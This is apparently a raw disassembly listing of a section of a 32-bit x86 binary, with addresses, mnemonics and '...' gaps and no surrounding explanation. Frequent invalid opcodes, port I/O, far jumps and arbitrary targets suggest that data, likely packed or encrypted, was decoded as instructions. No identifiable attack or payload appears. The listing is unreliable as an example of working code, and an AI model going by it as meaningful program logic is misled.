  41c184:	jae    0x41c173
  41c186:	and    BYTE PTR [edi-0x17],al
  41c189:	out    dx,al
  41c18a:	cdq    
  41c18b:	sti    
  41c18c:	call   0xe9434374
  41c191:	out    0x0,eax
	...
  41c1af:	add    BYTE PTR [ecx-0x2],bh
  41c1b2:	call   0x46a643a2
  41c1b7:	jb     0x41c15b
  41c1b9:	cld    
  41c1ba:	cld    
  41c1bb:	mov    edi,0xe17663a2
  41c1c0:	mov    ebp,0x32d1363
  41c1c5:	sar    bh,0xb8
  41c1c8:	fnstcw WORD PTR [edi]
  41c1ca:	mov    DWORD PTR [esi],esp
  41c1cc:	jmp    0xf450b4a1
  41c1d1:	jnp    0x41c193
  41c1d3:	add    al,bh
  41c1d5:	or     DWORD PTR [ebx],ecx
  41c1d7:	mov    esi,0xe87b27
  41c1dc:	call   0xe85109d9
  41c1e1:	std    
  41c1e2:	cld    
  41c1e3:	jmp    DWORD PTR [eax+ebp*4+0xc]
  41c1e7:	test   cl,ah
  41c1e9:	add    BYTE PTR [eax],al
  41c1eb:	add    ah,ch
  41c1ed:	outs   dx,DWORD PTR ds:[esi]
  41c1ee:	add    BYTE PTR [eax-0x27],cl
  41c1f1:	arpl   WORD PTR [eax-0x39feb3b3],ax
  41c1f7:	inc    ebp
  41c1f8:	jnp    0x41c1fb
  41c1fa:	cmp    bl,0x36
  41c1fd:	push   ebp
  41c1fe:	or     ecx,DWORD PTR [ebp+0x69e897e9]
  41c204:	or     bh,dl
  41c206:	cli    
  41c207:	mov    ebp,DWORD PTR [ebp+eiz*8-0x6]
  41c20b:	jne    0x41c287
  41c20d:	jmp    0xff5f:0xb08cbc70
	...
  41c230:	add    BYTE PTR [eax],al
  41c232:	xchg   ebx,eax
  41c233:	in     al,0x58
  41c235:	or     BYTE PTR [edx-0x5e],bh
  41c238:	cmc    
  41c239:	add    ebx,esi
  41c23b:	loop   0x41c242
  41c23d:	add    esp,esi
  41c23f:	inc    DWORD PTR [esi+0x3ee4e073]
  41c245:	or     BYTE PTR [ebp-0x5e],bl
  41c248:	add    eax,0x8566a85
  41c24d:	push   eax
  41c24e:	push   ebx
  41c24f:	bnd ret 
  41c251:	adc    ah,BYTE PTR [edi+edi*8-0x7a]
  41c255:	lock sub ecx,esi
  41c258:	or     cl,BYTE PTR [esi-0xb4]
  41c25e:	inc    ecx
  41c25f:	mov    ds:0x2d7e50cd,al
  41c264:	call   0xfb1a135b
  41c269:	mov    ecx,DWORD PTR ds:0xe881519c
  41c26f:	clc    
  41c270:	add    BYTE PTR [edi-0x772ddf38],al
  41c276:	inc    ebp
  41c277:	sbb    edi,DWORD PTR [esi-0x421ff22d]
  41c27d:	(bad)  [ebp-0x23]
  41c280:	jecxz  0x41c27e
  41c282:	pop    edx
  41c283:	aad    0x43
  41c285:	or     eax,0x3e488
  41c28a:	or     eax,0x35d3eedc
  41c28f:	xor    ecx,esp
  41c291:	cld    
  41c292:	cmp    dl,BYTE PTR [eax-0x6b]
	...
  41c2b1:	add    BYTE PTR [eax],al
  41c2b3:	add    BYTE PTR ds:0xca3bd759,cl
  41c2b9:	add    DWORD PTR [edi-0x7d],esi
  41c2bc:	rcl    DWORD PTR [ecx+0x58a7fd65],0xd1
  41c2c3:	cld    
  41c2c4:	clc    
  41c2c5:	sub    BYTE PTR [esi],cl
  41c2c7:	inc    eax
  41c2c8:	or     eax,0x900c3fd6
  41c2cd:	fisttp DWORD PTR [edi-0x9]
  41c2d0:	cli    
  41c2d1:	jns    0x41c34e
  41c2d3:	and    DWORD PTR [ecx-0x1e],0x64
  41c2d7:	std    
  41c2d8:	cwde   
  41c2d9:	rol    edi,cl
  41c2db:	cld    
  41c2dc:	loop   0x41c2af
  41c2de:	shr    DWORD PTR [ecx+0xd],cl
  41c2e1:	(bad)  
  41c2e3:	or     eax,DWORD PTR [ebx+eax*4-0x36350338]
  41c2ea:	fs jbe 0x41c302
  41c2ed:	sbb    bh,BYTE PTR [edi+0x70]
  41c2f0:	mov    edx,0xc0164b9
  41c2f5:	pop    ecx
  41c2f6:	add    ebp,edi
  41c2f8:	add    ch,ch
  41c2fa:	push   cs
  41c2fb:	inc    eax
  41c2fc:	or     eax,0xbff6bd6
  41c301:	add    BYTE PTR [ebp+esi*1-0x70],ch
  41c305:	bound  ebx,QWORD PTR [esi]
  41c307:	add    esi,0xffffffef
  41c30a:	adc    eax,0xddff8067
  41c30f:	jge    0x41c342
  41c311:	arpl   WORD PTR [esi],ax
  41c313:	xchg   BYTE PTR [si+0x13],bh
  41c317:	ins    DWORD PTR es:[edi],dx
	...
  41c334:	add    BYTE PTR [eax],al
  41c336:	push   0xb75b9762
  41c33b:	push   esp
  41c33c:	out    0x3,eax
  41c33e:	jb     0x41c34e
  41c340:	out    0x66,al
  41c342:	push   eax
  41c343:	cmp    DWORD PTR [edi+ebp*2],esp
  41c346:	or     eax,0x4066e159
  41c34b:	bound  esi,QWORD PTR ds:0x1df7be67
  41c351:	addr16 push ds
  41c353:	cmp    al,0xd9
  41c355:	ret    
  41c356:	sub    dh,BYTE PTR [edx+0x329443f9]
  41c35c:	mov    edi,0xa6622121
  41c361:	jg     0x41c3b0
  41c363:	in     al,dx
  41c364:	stc    
  41c365:	js     0x41c3b5
  41c367:	dec    esp
  41c368:	jg     0x41c330
  41c36a:	ins    DWORD PTR es:[edi],dx
  41c36b:	popa   
  41c36c:	mov    ?,WORD PTR [edx-0xb]
  41c36f:	jnp    0x41c2f7
  41c371:	lock fist DWORD PTR [edi+0x17]
  41c375:	addr16 call 0xbf3227dc
  41c37b:	pop    eax
  41c37c:	aas    
  41c37d:	loope  0x41c358
  41c37f:	popa   
  41c380:	push   0xffffffb8
  41c382:	(bad)  
  41c384:	imul   ebp,edx,0x16d91f2a
  41c38a:	aaa    
  41c38b:	add    ebx,DWORD PTR [eax+ebp*4+0x79]
  41c38f:	bound  eax,QWORD PTR [esi+0x66]
  41c392:	push   ebp
  41c393:	pop    eax
  41c394:	fidiv  WORD PTR [ebx+0x6200000d]
	...
  41c3b6:	add    BYTE PTR [eax],al
  41c3b8:	lahf   
  41c3b9:	add    eax,0x3b16086a
  41c3be:	mov    DWORD PTR [edi],esi
  41c3c0:	mov    ss:0x7d0ee82a,al
  41c3c6:	rcr    BYTE PTR [ebx+edi*2+0x32c84677],0x27
  41c3ce:	je     0x41c3bd
  41c3d0:	repnz aas 
  41c3d2:	jae    0x41c3b9
  41c3d4:	(bad)  
  41c3d5:	mov    ch,0xf7
  41c3d7:	(bad)  
  41c3d9:	mov    esi,0x78f3ba2b
  41c3de:	jnp    0x41c3b5
  41c3e0:	and    al,0x3b
  41c3e2:	je     0x41c3fb
  41c3e4:	imul   ebp,DWORD PTR [edx],0x38
  41c3e7:	pop    ebp
  41c3e8:	(bad)  
  41c3e9:	jbe    0x41c42c
  41c3eb:	sbb    esp,esp
  41c3ed:	cmp    dh,BYTE PTR [ebx+edx*1+0x53]
  41c3f1:	sub    bh,BYTE PTR [eax]
  41c3f3:	xor    eax,0x641dd60a
  41c3f8:	jb     0x41c456
  41c3fa:	cld    
  41c3fb:	scas   al,BYTE PTR es:[edi]
  41c3fc:	mov    al,0xc7
  41c3fe:	out    0xf0,eax
  41c400:	pop    esi
  41c401:	add    BYTE PTR [eax],al
  41c403:	sahf   
  41c404:	cld    
  41c405:	adc    BYTE PTR [ecx+0x2bef68af],cl
  41c40b:	cmp    DWORD PTR [edx+0x5119ebbd],eax
  41c411:	rcl    DWORD PTR [esi],cl
  41c413:	call   0xda064326
  41c418:	inc    ebp
  41c419:	adc    al,0x89
  41c41b:	sub    al,BYTE PTR [eax]
	...
  41c439:	add    BYTE PTR ds:0xcaddc527,bl
  41c43f:	loopne 0x41c478
  41c441:	jmp    0xf6ab9000
  41c446:	cmp    ebp,DWORD PTR [ebp+0x63304f04]
  41c44c:	pop    eax
  41c44d:	add    BYTE PTR [esp+esi*4-0x56],bl
  41c451:	add    BYTE PTR [ebx+ebx*8+0x222f346e],dh
  41c458:	push   eax
  41c459:	lea    esi,[ecx-0x38]
  41c45c:	dec    edi
  41c45d:	call   0x3eb9c7
  41c462:	idiv   DWORD PTR [edi+0x5a333b0b]
  41c468:	xor    BYTE PTR [ebx],al
  41c46a:	and    al,0x4c
  41c46c:	cld    
  41c46d:	jne    0x41c487
  41c46f:	jmp    0xfec0a8ec
  41c474:	push   edi
  41c475:	call   0x3ff632
  41c47a:	out    dx,eax
  41c47b:	mov    al,ds:0xf06139e1
  41c480:	retf   
  41c481:	inc    ebx
  41c482:	xor    al,0x51
  41c484:	or     edi,edi
  41c486:	loope  0x41c44f
  41c488:	out    0x50,eax
  41c48a:	or     eax,0xc182fffd
  41c48f:	(bad)  
  41c490:	(bad)  
  41c491:	jmp    0x9f14:0xf8497f1d
  41c498:	adc    al,0xcc
  41c49a:	out    0xfb,eax
  41c49c:	jg     0x41c51b
	...
  41c4ba:	add    BYTE PTR [eax],al
  41c4bc:	jae    0x41c499
  41c4be:	jo     0x41c4d4
  41c4c0:	je     0x41c52a
  41c4c2:	adc    eax,0x805e2101
  41c4c7:	jnp    0x41c495
  41c4c9:	add    esi,DWORD PTR [ebx+0xe]
  41c4cc:	jb     0x41c46c
  41c4ce:	cmc    
  41c4cf:	and    al,ah
  41c4d1:	push   edi
  41c4d2:	call   0xf4a838dd
  41c4d7:	add    ecx,esp
  41c4d9:	pop    edi
  41c4da:	or     BYTE PTR [ebp+0x6c],0x5b
  41c4de:	repz inc ebp
  41c4e0:	sub    al,0x5b
  41c4e2:	or     al,0x84
  41c4e4:	or     eax,0xd00021a
  41c4e9:	loop   0x41c4aa
  41c4eb:	daa    
  41c4ec:	retf   
  41c4ed:	lods   al,BYTE PTR ds:[esi]
  41c4ee:	clc    
  41c4ef:	call   DWORD PTR [ecx+0x3711ee29]
  41c4f5:	ds jbe 0x41c573
  41c4f8:	popa   
  41c4f9:	jno    0x41c554
  41c4fb:	adc    esp,DWORD PTR [edx+0x69]
  41c4fe:	add    DWORD PTR [ecx+0x4d79952],ecx
  41c504:	jbe    0x41c498
  41c506:	imul   eax,DWORD PTR [ebx+0x75],0x59
  41c50a:	in     eax,dx
  41c50b:	cmp    BYTE PTR [edx-0x26],dh
  41c50e:	sbb    al,0xe8
  41c510:	outs   dx,DWORD PTR ds:[esi]
  41c511:	cmp    DWORD PTR [edx],eax
  41c513:	add    BYTE PTR [esi+0x5d737759],dl
  41c519:	in     al,0x6a
  41c51b:	or     eax,0x2de89
	...
  41c53c:	add    BYTE PTR [eax],al
  41c53e:	or     eax,0xce3743fa
  41c543:	add    dl,bl
  41c545:	inc    ecx
  41c546:	mov    BYTE PTR [ebp+0x11],dl
  41c549:	mov    al,BYTE PTR [edi]
  41c54b:	jmp    0x63e1ebaa
  41c550:	inc    edi
  41c551:	add    dl,BYTE PTR [edi]
  41c553:	inc    edx
  41c554:	or     al,0x80
  41c556:	adc    al,0x2
  41c558:	xlat   BYTE PTR ds:[ebx]
  41c559:	add    BYTE PTR [ebx+0x6b],cl
  41c55c:	and    DWORD PTR [eax+0x46],eax
  41c55f:	sub    ch,BYTE PTR [edx+esi*2]
  41c562:	out    dx,al
  41c563:	and    DWORD PTR ds:0x1497681,0x30d880d
  41c56d:	add    BYTE PTR ds:0x608afbf3,cl
  41c573:	sar    DWORD PTR [ebx+0x41e95e7],0x0
  41c57a:	xchg   bh,bh
  41c57c:	sub    eax,0xbf0934b4
  41c581:	imul   edx,DWORD PTR [eax-0x6dfc1811],0xffffffc4
  41c588:	push   esi
  41c589:	xchg   DWORD PTR [esi],esi
  41c58b:	push   eax
  41c58c:	out    0x12,eax
  41c58e:	xchg   ecx,eax
  41c58f:	ret    
  41c590:	out    0x3,eax
  41c592:	or     eax,0xd6bcc83
  41c597:	sahf   
  41c598:	daa    
  41c599:	cmp    cl,BYTE PTR [eax+eax*1-0x43]
  41c59d:	bound  ebx,QWORD PTR [esi]
  41c59f:	clc    
  41c5a0:	clc    
  41c5a1:	ret    
	...
  41c5be:	add    BYTE PTR [eax],al
  41c5c0:	and    ah,0x47
  41c5c3:	mov    al,ds:0xe9e6c263
  41c5c8:	(bad)  
  41c5c9:	aas    
  41c5ca:	jnp    0x41c590
  41c5cc:	xchg   ebp,eax
  41c5cd:	or     al,0x33
  41c5cf:	cmp    cl,ah
  41c5d1:	jmp    FWORD PTR [ebx+0x4d]
  41c5d4:	loope  0x41c5ec
  41c5d6:	ficomp WORD PTR [edx-0x5314fb3]
  41c5dc:	sbb    al,BYTE PTR [ecx]
  41c5de:	out    0x88,eax
  41c5e0:	dec    ebp
  41c5e1:	rol    DWORD PTR [eax],cl
  41c5e3:	adc    eax,DWORD PTR [eax-0x33c6750c]
  41c5e9:	(bad)  
  41c5ea:	stc    
  41c5eb:	dec    esp
  41c5ec:	xchg   edx,eax
  41c5ed:	(bad)  
  41c5ee:	into   
  41c5ef:	mov    BYTE PTR [edi],bh
  41c5f1:	rcl    eax,cl
  41c5f3:	jmp    0x2460e185
  41c5f8:	pushf  
  41c5f9:	push   es
  41c5fa:	adc    DWORD PTR [edi+eiz*2],esp
  41c5fd:	out    0x6f,al
  41c5ff:	test   DWORD PTR [edx+0xd],0x36b6f85e
  41c606:	sub    al,BYTE PTR [edx+esi*1]
  41c609:	sbb    DWORD PTR [ecx+0x7db6f0d5],esi
  41c60f:	clc    
  41c610:	push   es
  41c611:	repnz jmp FWORD PTR [eax]
  41c614:	adc    DWORD PTR [ebx+0x71],ebx
  41c617:	loope  0x41c59c
  41c619:	mov    edi,0x680ed30b
  41c61e:	sub    al,0xef
  41c620:	or     DWORD PTR [eax],eax
  41c622:	mov    DWORD PTR [ecx+0x0],edx
	...
  41c641:	add    BYTE PTR [ebp-0x659af2a5],al
  41c647:	add    BYTE PTR [eax],al
  41c649:	jmp    0x979fe006
  41c64e:	jge    0x41c5d1
  41c650:	loopne 0x41c689
  41c652:	das    
  41c653:	pop    ebx
  41c654:	push   0xffffffe9
  41c656:	pop    esi
  41c657:	pop    esp
  41c658:	adc    edi,DWORD PTR [ecx+0x6a001d84]
  41c65e:	retf   0x8b0b
  41c661:	ins    BYTE PTR es:[edi],dx
  41c662:	out    dx,al
  41c663:	pop    ebp
  41c664:	std    
  41c665:	push   cs
  41c666:	mov    esi,0x4305ffe7
  41c66b:	or     DWORD PTR [edi-0x2a211cc],eax
  41c671:	imul   ah
  41c673:	into   
  41c674:	pop    es
  41c675:	out    dx,al
  41c676:	pop    edx
  41c677:	cdq    
  41c678:	adc    ebp,DWORD PTR [ecx]
  41c67a:	adc    DWORD PTR [edi-0x8],edi
  41c67d:	call   0xffab9bdd
  41c682:	mov    edx,DWORD PTR [ecx+0x5aaccc4c]
  41c688:	pop    eax
  41c689:	shr    DWORD PTR [ecx],1
  41c68b:	stos   DWORD PTR es:[edi],eax
  41c68c:	add    cl,ch
  41c68e:	xor    dh,dh
  41c690:	mov    bh,BYTE PTR [ebp+ecx*1+0x5b]
  41c694:	std    
  41c695:	scas   al,BYTE PTR es:[edi]
  41c696:	push   ecx
  41c697:	or     dl,BYTE PTR gs:[edi+0x11]
  41c69b:	add    BYTE PTR [ecx-0x76ff82e4],al
  41c6a1:	cmp    al,0x69
  41c6a3:	xchg   DWORD PTR [ecx-0x7],ecx
	...
  41c6c2:	add    BYTE PTR [eax],al
  41c6c4:	xchg   esi,eax
  41c6c5:	mov    bh,0x73
  41c6c7:	add    BYTE PTR [esp+eax*1],dh
  41c6ca:	xchg   eax,esi
  41c6cc:	repz inc ebp
  41c6ce:	jb     0x41c6bc
  41c6d0:	imul   edx,DWORD PTR [esi],0x8474440b
  41c6d6:	lds    esi,FWORD PTR [ebp-0x47]
  41c6d9:	jns    0x41c6a3
  41c6db:	jbe    0x41c751
  41c6dd:	add    dh,dh
  41c6df:	inc    ebp
  41c6e0:	pop    esp
  41c6e1:	add    DWORD PTR [esi+eax*1+0x51],esi
  41c6e5:	test   DWORD PTR [edi+edi*8],ebx
  41c6e8:	push   ebx
  41c6e9:	(bad)  
  41c6eb:	jne    0x41c6d1
  41c6ed:	cdq    
  41c6ee:	dec    edi
  41c6ef:	push   ecx
  41c6f0:	je     0x41c689
  41c6f2:	mov    al,BYTE PTR [ebp-0x54290]
  41c6f8:	(bad)  
  41c6f9:	repz mov edi,0xfdcfe183
  41c6ff:	jmp    DWORD PTR [ebx]
  41c701:	or     BYTE PTR [edx+0x0],ch
  41c704:	push   ebx
  41c705:	aam    0xbf
  41c707:	push   edi
  41c708:	test   ebx,0x6dfc5006
  41c70e:	sahf   
  41c70f:	add    DWORD PTR [ebx+eax*4-0x3c],esp
  41c713:	sub    ah,ch
  41c715:	inc    esp
  41c716:	or     BYTE PTR [edi+0x5c],dl
  41c719:	call   0xe870:0xdf340124
  41c720:	dec    esp
  41c721:	xchg   edx,eax
  41c722:	and    al,0x1
  41c724:	and    al,0xdf
  41c726:	jo     0x41c718
	...
  41c744:	add    BYTE PTR [eax],al
  41c746:	cmp    al,0x4a
  41c748:	and    al,0x1
  41c74a:	xor    al,0x80
  41c74c:	jns    0x41c759
  41c74e:	and    al,0x35
  41c750:	add    DWORD PTR [ebx-0xd4437],eax
  41c756:	sub    eax,edx
  41c758:	out    0x38,eax
  41c75a:	retf   
  41c75b:	(bad)  
  41c75c:	push   ebp
  41c75e:	or     eax,0x79ff5c2c
  41c763:	cmp    BYTE PTR [edi+eiz*8-0x2a0284f],dh
  41c76a:	mov    DWORD PTR [ecx+0x248e03d5],ebp
  41c770:	pop    esp
  41c771:	add    bl,bl
  41c773:	and    al,0x5c
  41c775:	adc    BYTE PTR [ecx+0x4],al
  41c778:	cmp    DWORD PTR [ecx+0x1],0x68
  41c77c:	(bad)  
  41c77d:	push   es
  41c77e:	xchg   BYTE PTR [esi+0x65358119],ah
  41c784:	add    DWORD PTR [ebx+0x1b],esi
  41c787:	jbe    0x41c7f2
  41c789:	push   ds
  41c78a:	call   0x59d:0xcd84601a
  41c791:	add    DWORD PTR [eax+0x11],0x2100fd05
  41c798:	mov    ecx,?
  41c79a:	jne    0x41c75d
  41c79c:	cmp    bh,0x7a
  41c79f:	faddp  st(5),st
  41c7a1:	not    edx
  41c7a3:	stos   BYTE PTR es:[edi],al
  41c7a4:	mov    esp,0x16d4fc6
  41c7a9:	push   ebx
	...
  41c7c6:	add    BYTE PTR [eax],al
  41c7c8:	xchg   esi,eax
  41c7c9:	or     eax,0xe5f5438c
  41c7ce:	ins    BYTE PTR es:[edi],dx
  41c7cf:	adc    al,0xbe
  41c7d1:	jb     0x41c75f
  41c7d3:	xor    BYTE PTR [esi+0xd89002c],dl
  41c7d9:	adc    cl,BYTE PTR [edi+0x6b32137c]
  41c7df:	es or  al,0x69
  41c7e2:	add    DWORD PTR [eax-0x7cf2f415],eax
  41c7e8:	add    DWORD PTR [eax+0x1],ebp
  41c7eb:	add    BYTE PTR [edi+0x178002fb],al
  41c7f1:	pop    ecx
  41c7f2:	push   cs
  41c7f3:	sbb    BYTE PTR ds:0xd03e800,0x80
  41c7fa:	mov    eax,ds:0xee83081d
  41c7ff:	add    al,0xd
  41c801:	add    BYTE PTR [edx-0x2f],ah
  41c804:	add    al,BYTE PTR [edi-0x733bed10]
  41c80a:	and    eax,0x6702e45f
  41c80f:	sbb    al,0x2e
  41c811:	aad    0xe4
  41c813:	ret    0x1752
  41c816:	das    
  41c817:	(bad)  
  41c818:	mov    edi,0x8052a51
  41c81d:	test   DWORD PTR [esi+0x4],ecx
  41c820:	or     eax,0xdd5a6700
  41c825:	aam    0xea
  41c827:	adc    cl,ch
  41c829:	data16 add al,0x91
	...
  41c848:	add    BYTE PTR [eax],al
  41c84a:	dec    esi
  41c84b:	pop    esp
  41c84c:	xchg   edi,eax
  41c84d:	pop    esi
  41c84e:	push   ds
  41c84f:	or     BYTE PTR [edi-0x47],bl
  41c852:	xchg   BYTE PTR [ecx-0x54],al
  41c855:	pusha  
  41c856:	or     eax,0x7a01f568
  41c85b:	pop    edx
  41c85c:	push   0x5c
  41c85e:	jb     0x41c869
  41c860:	pop    ebx
  41c861:	inc    edx
  41c862:	or     eax,0xce1ae700
  41c867:	out    dx,eax
  41c868:	in     eax,dx
  41c869:	and    BYTE PTR [edx-0x7bfc1901],0xcc
  41c870:	ficom  DWORD PTR [eax+0xb724111]
  41c876:	xchg   esp,eax
  41c877:	xlat   BYTE PTR ds:[ebx]
  41c878:	loop   0x41c8a4
  41c87a:	inc    edx
  41c87b:	(bad)  
  41c87c:	and    edi,eax
  41c87e:	fnstenv [eax+0xf39fbe]
  41c884:	out    0x8c,eax
  41c886:	into   
  41c887:	push   edi
  41c888:	fs pop esi
  41c88a:	mov    eax,ds:0xce6c0007
  41c88f:	or     al,0x84
  41c891:	test   BYTE PTR [esi],cl
  41c893:	add    BYTE PTR [eax],al
  41c895:	ds xchg esi,eax
  41c897:	cmp    al,ch
  41c899:	and    al,0x6e
  41c89b:	pop    ebx
  41c89c:	std    
  41c89d:	bound  esi,QWORD PTR [ebp-0x6804770b]
  41c8a3:	cmp    BYTE PTR [ecx+0x870d2c],cl
  41c8a9:	ins    BYTE PTR es:[edi],dx
  41c8aa:	mov    edx,0x62fdf1
	...
  41c8cb:	add    ch,al
  41c8cd:	icebp  
  41c8ce:	mov    cl,ch
  41c8d0:	xchg   edi,eax
  41c8d1:	dec    eax
  41c8d2:	sub    DWORD PTR [edi],esi
  41c8d4:	popf   
  41c8d5:	int3   
  41c8d6:	push   cs
  41c8d7:	pop    edi
  41c8d8:	out    0x4f,eax
  41c8da:	xchg   DWORD PTR [edx+ebx*2-0x68a68c7f],esp
  41c8e1:	int    0x17
  41c8e3:	je     0x41c8b8
  41c8e5:	pop    edx
  41c8e6:	in     eax,0xa4
  41c8e8:	in     eax,0x58
  41c8ea:	std    
  41c8eb:	ins    DWORD PTR es:[edi],dx
  41c8ec:	dec    esi
  41c8ed:	aam    0x6a
  41c8ef:	(bad)  
  41c8f0:	rol    BYTE PTR [esi+0x6965ea30],1
  41c8f6:	and    DWORD PTR [edx],0x1611cf0c
  41c8fc:	push   ebp
  41c8fd:	dec    ebp
  41c8fe:	mov    esp,DWORD PTR [edi-0x12754ff4]
  41c904:	jmp    FWORD PTR [edi+0x5930cae7]
  41c90a:	std    
  41c90b:	add    bl,BYTE PTR [ecx-0x2d]
  41c90e:	or     al,0x62
  41c910:	pop    ebp
  41c911:	dec    ebp
  41c912:	mov    ebp,DWORD PTR [edi]
  41c914:	cmpxchg BYTE PTR [edx+0x25681df5],cl
  41c91b:	femms  
  41c91d:	add    BYTE PTR [ecx-0x32],dl
  41c920:	inc    edx
  41c921:	push   ecx
  41c922:	push   esi
  41c923:	add    BYTE PTR [ebx+0x51],cl
  41c926:	dec    ecx
  41c927:	push   ss
  41c928:	in     al,0x3
  41c92a:	jg     0x41c8f0
  41c92c:	sub    BYTE PTR [eax+esi*2+0xf8],bh
	...
  41c94b:	add    BYTE PTR [eax],al
  41c94d:	add    ah,cl
  41c94f:	jns    0x41c972
  41c951:	add    esp,esi
  41c953:	xchg   DWORD PTR [ecx+0x1c],eax
  41c956:	jge    0x41c954
  41c958:	xchg   BYTE PTR [ebp-0x4],al
  41c95b:	xchg   DWORD PTR [eax],eax
  41c95d:	lea    eax,[eax]
  41c95f:	pop    edx
  41c960:	cld    
  41c961:	lea    ecx,[eax]
  41c963:	cld    
  41c964:	cli    
  41c965:	inc    esi
  41c966:	iret   
  41c967:	mov    bl,0xa
  41c969:	xor    BYTE PTR [esi-0x47],0xfa
  41c96d:	inc    DWORD PTR [edi*8-0x3a30a1a6]
  41c974:	rcr    DWORD PTR [eax],0xa4
  41c977:	out    dx,al
  41c978:	mov    edi,0x70bb51eb
  41c97d:	clc    
  41c97e:	dec    esp
  41c97f:	mov    ah,BYTE PTR [ecx]
  41c981:	add    DWORD PTR [edi+eiz*8-0x2fe0aa0f],esi
  41c988:	jle    0x41c976
  41c98a:	js     0x41c913
  41c98c:	inc    ecx
  41c98d:	or     bh,ch
  41c98f:	add    ecx,DWORD PTR [edi+0x56]
  41c992:	push   DWORD PTR [eax]
  41c994:	or     DWORD PTR [ebx-0x37ff6c96],ecx
  41c99a:	mov    eax,cs
  41c99c:	jne    0x41c9de
  41c99e:	je     0x41c925
  41c9a0:	dec    ecx
  41c9a1:	clc    
  41c9a2:	aas    
  41c9a3:	les    ecx,FWORD PTR [edx+ebp*2+0x41]
  41c9a7:	xchg   edi,eax
  41c9a8:	ret    
  41c9a9:	inc    ebp
  41c9aa:	pop    ebx
  41c9ab:	cld    
  41c9ac:	out    0x6b,eax
  41c9ae:	push   edx
  41c9af:	std    
  41c9b0:	dec    DWORD PTR [edx+0x0]
	...
  41c9ce:	add    BYTE PTR [eax],al
  41c9d0:	dec    esp
  41c9d1:	adc    edi,0xffd9b00f
  41c9d7:	dec    DWORD PTR ds:0x197b8867
  41c9dd:	out    0xdd,eax
  41c9df:	cld    
  41c9e0:	or     eax,0xed6a1c1c
  41c9e5:	jmp    0x41c9c4
  41c9e7:	xlat   BYTE PTR ds:[ebx]
  41c9e8:	mov    ch,0x3e
  41c9ea:	mov    bh,0xa8
  41c9ec:	or     eax,0xf5438e69
  41c9f1:	sbb    DWORD PTR [edi+ebx*1+0x54],ebp
  41c9f5:	jbe    0x41ca53
  41c9f7:	test   ch,cl
  41c9f9:	cmc    
  41c9fa:	std    
  41c9fb:	or     al,0xa2
  41c9fd:	sbb    al,0x70
  41c9ff:	push   eax
  41ca00:	xchg   esi,eax
  41ca01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca02:	mov    cl,0x69
  41ca04:	sbb    eax,0xa5738cf6
  41ca09:	sub    DWORD PTR [ebp-0x7796f3ec],0x58d21173
  41ca13:	push   edi
  41ca14:	push   esp
  41ca15:	fcomp  QWORD PTR [ebx+0x7d]
  41ca18:	psubd  mm3,QWORD PTR [edx-0x77]
  41ca1c:	pop    eax
  41ca1d:	mov    cl,0x27
  41ca1f:	leave  
  41ca20:	mov    ?,WORD PTR [eax-0x6d77b10b]
  41ca26:	test   BYTE PTR [edx+0x4fb22e09],0x94
  41ca2d:	pushf  
  41ca2e:	push   ebp
  41ca2f:	std    
  41ca30:	sbb    BYTE PTR [ecx+0x3ff3],cl
	...
  41ca52:	or     eax,0xda0c44ea
  41ca57:	fcmovnb st,st(5)
  41ca59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca5a:	mov    ebp,0xd1135c99
  41ca5f:	ss sar edi,0x87
  41ca63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca64:	or     DWORD PTR [ecx-0x173c23fc],ecx
  41ca6a:	or     al,0x5f
  41ca6c:	add    BYTE PTR [esi],cl
  41ca6e:	xchg   esi,eax
  41ca6f:	add    BYTE PTR [eax+edx*2],ch
  41ca72:	mov    WORD PTR [ebx+ebp*8],?
  41ca75:	jmp    0x41cabd
  41ca77:	into   
  41ca78:	es add al,0x92
  41ca7b:	(bad)
  41ca7e:	push   ebp
  41ca7f:	mov    cl,0x50
  41ca81:	icebp  
  41ca82:	mov    ch,0x3d
  41ca84:	and    al,0x5b
  41ca86:	adc    bl,BYTE PTR [edi-0x5b]
  41ca89:	and    DWORD PTR [edx],ecx
  41ca8b:	push   edi
  41ca8c:	bound  edi,QWORD PTR [esi+ecx*4]
  41ca8f:	cmp    dh,dh
  41ca91:	xor    BYTE PTR [ebx+0x57],0x9e
  41ca95:	pop    ebx
  41ca96:	xchg   DWORD PTR [ebp+edx*4-0x6044b745],edi
  41ca9d:	inc    esi
  41ca9e:	adc    eax,0xe98f1c00
  41caa3:	or     BYTE PTR [ebx+0x1dae3df4],0x8f
  41caaa:	mov    ebp,0xe78ee4e9
  41caaf:	mov    ecx,0x8abed16f
  41cab4:	sub    BYTE PTR [edi],bl
	...
  41cad2:	add    BYTE PTR [eax],al
  41cad4:	mov    edi,0xdd8ef5d1
  41cad9:	sbb    bl,BYTE PTR [ecx-0x2a]
  41cadc:	sti    
  41cadd:	sbb    bh,BYTE PTR [edi+ecx*2-0x713b13e0]
  41cae4:	push   ss
  41cae5:	lock int3 
  41cae7:	add    BYTE PTR ds:0x2bf4b3fc,0xcd
  41caee:	sbb    al,BYTE PTR [edi]
  41caf0:	push   ebx
  41caf1:	sbb    BYTE PTR [edi+ecx*2+0x43d960fc],dh
  41caf8:	jb     0x41cb6c
  41cafa:	call   0x28c4d802
  41caff:	add    al,BYTE PTR [ebp+edx*2-0x43b4a22e]
  41cb06:	push   ebp
  41cb08:	push   cs
  41cb09:	jg     0x41cb56
  41cb0b:	stc    
  41cb0c:	xchg   ecx,eax
  41cb0d:	(bad)  
  41cb0f:	pop    ebp
  41cb10:	push   es
  41cb11:	lods   eax,DWORD PTR ds:[esi]
  41cb12:	sub    BYTE PTR [ecx-0x57184ff4],0xa
  41cb19:	push   edi
  41cb1a:	std    
  41cb1b:	pusha  
  41cb1c:	dec    ebp
  41cb1d:	dec    esi
  41cb1e:	jmp    0xf8245f10
  41cb23:	jmp    0x22b61fb5
  41cb28:	xchg   edx,eax
  41cb29:	fincstp 
  41cb2b:	jmp    0x2cccd102
  41cb30:	pop    ebp
  41cb31:	mov    al,0x8a
  41cb33:	and    al,0x51
  41cb35:	mov    al,0xe7
  41cb37:	dec    esi
	...
  41cb54:	add    BYTE PTR [eax],al
  41cb56:	inc    esp
  41cb57:	push   ebx
  41cb58:	std    
  41cb59:	(bad)  
  41cb5a:	lds    edx,FWORD PTR [ecx-0x7d]
  41cb5d:	xchg   dl,cl
  41cb5f:	es cmp esp,0x6d0d0036
  41cb66:	sub    BYTE PTR [ebp-0x3],dl
  41cb69:	jmp    0x74499d01
  41cb6e:	int    0x51
  41cb70:	push   eax
